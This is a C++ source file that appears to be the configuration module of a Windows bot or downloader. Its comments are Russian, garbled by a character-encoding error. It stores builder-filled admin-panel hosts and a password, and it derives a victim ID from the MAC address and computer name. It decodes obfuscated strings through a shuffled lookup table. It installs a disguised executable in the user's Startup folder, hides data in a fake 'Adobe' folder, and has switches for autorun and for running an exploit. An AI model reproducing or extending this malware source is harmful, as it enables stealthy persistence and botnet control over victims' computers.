#include "main.h"
#include "config.h"
#include "core\debug.h"
#include "core\crypt.h"
#include "core\util.h"

namespace Config
{
//данные заполн€емые билдером
char PeriodConnect[MaxSizePeriodConnect] = PERIOD_CONTACT;
char Prefix[MaxSizePrefix] = PREFIX_NAME;
char Hosts[MaxSizeHostAdmin] = ADMIN_PANEL_HOSTS;
char Password[MaxSizePasswordAdmin] = ADMIN_PASSWORD;
byte RandVector[MaxSizeRandVector] = MASK_RAND_VECTOR;
char MiscState[MaxSizeMiscState] = MISC_STATE;
char TableDecodeString[256]; //таблица дл€ перекодировки символов в зашифрованной строке

//данные заполн€емые при старте бота
char UID[32];
//маска накладываема€ на строки с целью генерации случайных (уникальных) имен
char XorMask[32];
int waitPeriod;

char fileNameBot[MAX_PATH]; //им€ автозагрузочного файла бота
char nameService[64];

//данные дл€ генератора случайных чисел используемый дл€ декодировки
uint randA, randB, randR;
HANDLE botMutex = 0;
uint state = 0;

//создает уид бота и маску дл€ генерации случайных имен
static bool GenUID()
{
	byte buf[64];
	int c_macAddress = GetMacAddress(buf);
	if( c_macAddress == 0 ) return false;
	//мак адрес занимает 6 байт
	int hash1 = *((DWORD*)buf) ^ *((DWORD*)(buf + 2));
	DWORD c_compName = sizeof(buf) - c_macAddress;
	if( API(KERNEL32, GetComputerNameA)( (char*)buf + c_macAddress, &c_compName ) == 0 ) return false;
	uint hash2 = CalcHash( buf, c_macAddress + c_compName );
	//маску делаем на основе уида без префикса
	Str::Format( XorMask, _CS_("%08x%08x"), hash1, hash2 );
	//формируем уид с префиксом
	StringBuilderStack<sizeof(UID)> _UID;
	_UID += DECODE_STRING(Prefix);
	_UID += '0';
	_UID += XorMask;
	Str::Copy( UID, _UID, _UID.Len() );
	return true;
}

static uint DecodeGenRand()
{
	randR = (randR * randA + randB) & 0xffff;
	return randR;
}

static void ExchangeDist( char* table, int p1, int p2, int count )
{
	int dist = p2 - p1 + 1;
	for( int i = 0; i < count; i++ )
	{
		int i1 = (DecodeGenRand() % dist) + p1;
		int i2 = (DecodeGenRand() % dist) + p1;
		char t = table[i1];
		table[i1] = table[i2];
		table[i2] = t;
	}
}

static void InitDecodeTable()
{
	char table[256];
	for( int i = 0; i < 256; i++ )
		table[i] = i;
	int exchanges = (randR % 1000) + 128;
	ExchangeDist( table, 1, 31, exchanges ); //тасование кодов меньше пробела
	ExchangeDist( table, 32, 127, exchanges ); //тасование ascii кодов
	ExchangeDist( table, 128, 255, exchanges ); //тасование русских символов
	for( int i = 0; i < 256; i++ )
		TableDecodeString[ table[i] ] = i;
}

bool Init()
{
	state = 0;
	//извлекаем коэффициенты дл€ генератора случайных чисел
	int n = MaxSizeRandVector - sizeof(ushort) * 3;
	randR = *((ushort*)&RandVector[n]);
	randA = *((ushort*)&RandVector[n + 2]);
	randB = *((ushort*)&RandVector[n + 4]);
	//инициализаци€ таблицы перекодировки
	InitDecodeTable();
	if( !GenUID() ) return false;
	waitPeriod = Str::ToInt( DECODE_STRING(PeriodConnect) ) * 1000;
	if( waitPeriod <= 0 ) waitPeriod = 10 * 60 * 1000; //по умолчанию раз в 10 минут

	char miscState[MaxSizeMiscState];
	Str::Copy( miscState, sizeof(miscState), DECODE_STRING(MiscState) );
	if( miscState[0] == '0' ) //отключена инстал€ци€ в автозагрузку
	{
		state |= NOT_INSTALL_SERVICE | NOT_INSTALL_AUTORUN;
		DbgMsg( "ќтключена инстал€ци€ в автозагрузку" );
	}
	if( miscState[1] == '0' ) //отключен запуск сплойта
	{
		state |= SPLOYTY_OFF;
		DbgMsg( "ќтключен запуск сплойта" );
	}
	if( miscState[2] == '1' )
	{
		state |= CHECK_DUPLICATION;
		DbgMsg( "¬ключена проверка запуска копии" );
	}

	return true;
}

StringBuilder& NameBotExe( StringBuilder& name )
{
	Crypt::Name(_CS_("downloader"), XorMask, name );
	return name += _CS_(".exe");
}

StringBuilder& FullNameBotExe( StringBuilder& path )
{
	StringBuilderStack<MAX_PATH> startup;
	Path::GetStartupUser(startup);
	StringBuilderStack<32> name;
	NameBotExe(name);
	return Path::Combine( path, startup, name );
}

bool GetBotFolder( StringBuilder& path, const char* addFolder, bool cryptAddFolder )
{
	Path::GetCSIDLPath( CSIDL_COMMON_APPDATA, path, _CS_("Adobe") );
	Path::CreateDirectory(path);
	if( addFolder )
	{
		StringBuilder name;
		if( cryptAddFolder )
			Crypt::Name( addFolder, XorMask, name );
		else
			name = addFolder;
		Path::AppendFile( path, name );
		Path::CreateDirectory(path);
	}
	return true;
}

static void CreateNameMutex( StringBuilder& name )
{
	Crypt::Name( _CS_("downloader_mutex"), Config::XorMask, name );
}

bool CreateMutex()
{
	StringBuilderStack<32> name;
	CreateNameMutex(name);
	botMutex = Mutex::Create(name);
	if( botMutex )
		return true;
	return false;
}

void ReleaseMutex()
{
	if( botMutex )
	{
		Mutex::Release(botMutex);
		botMutex = 0;
	}
}

};

#ifdef ON_CODE_STRING
//определ€ем функцию дл€ декодировани€ зашифрованных строк
StringDecoded DECODE_STRING( const char* codeStr )
{
	int len = Str::Len(codeStr) - CountStringOpcode; //реальна€ длина строки
	if( len < 0 ) len = 0; //если закодирована пуста€ строка
	char* s = Str::Alloc(len + 1);
	int lenBlock = len / CountStringOpcode;
	int nb = 0; //номер блока
	int rb = 0; //сколько символов осталось в блоке
	int delta = 0;
	int n = 0;
	int i = 0;
	while( n < len )
	{
		if( rb == 0 )
		{
			nb++;
			if( nb <= CountStringOpcode )
			{
				delta = codeStr[i] - 'a';
				i++;
				rb = lenBlock;
			}
			else
				rb = len - n;
		}
		if( rb > 0 )
		{
			rb--;
			int c = codeStr[i];
			int min, max;
			if( c < 32 )
				min = 1, max = 31;
			else if( c < 128 )
				min = 32, max = 127;
			else
				min = 128, max = 255;
			c = Config::TableDecodeString[c];
			c -= delta;
			if( c < min ) c = max - min + c;
			s[n++] = c;
			i++;
		}
	}
	s[n] = 0;
	return StringDecoded(s);
}

#else

//StringDecoded DECODE_STRING( const char* codeStr )
//{
//	char* s = Str::Duplication(codeStr);
//	return StringDecoded(s);
//}

#endif //ON_CODE_STRING
